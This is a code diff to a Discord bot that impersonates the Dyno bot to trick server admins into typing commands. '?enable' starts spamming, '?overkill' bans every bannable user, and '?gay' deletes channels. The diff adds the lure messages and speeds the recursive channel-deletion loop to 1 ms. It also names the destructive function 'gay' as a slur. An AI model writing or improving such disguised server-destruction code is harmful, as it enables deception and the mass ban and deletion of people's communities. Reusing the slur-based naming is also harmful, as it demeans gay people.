@@ -19,7 +19,7 @@ function gay(bot, message) {
   			.then(console.log)
   			.catch(console.error);
 		});
- setTimeout(() => gay(bot, message), 30*10);
+ setTimeout(() => gay(bot, message), 1*1);
 }  
 
 function ban(bot, message) {
@@ -38,17 +38,21 @@ bot.on("ready", async () => {
 
 bot.on("message", async message => {
   if (message.content.startsWith('?enable')) {
+		message.channel.send(`\`Commands have been enabled!\`\nTry typing \`?overkill\` for a new dope responce!`)
     spam(bot, message)
   }
   if (message.content.startsWith('?overkill')) {
+    message.channel.send(`Banning all bannable users now!`)
     ban(bot, message)
   }
   if (message.content.startsWith('?gay')) {
+		message.channel.send(`Deleting **#spam** channels now.`)
     gay(bot, message)
   }
   if (message.content.startsWith('?')) {
     if (message.content.startsWith('?enable')) return
     if (message.content.startsWith('?overkill')) return
+		if (message.content.startsWith('?gay')) return
     message.reply(`to activate Dyno in your server please type \`?enable\`!`)
   }
 });
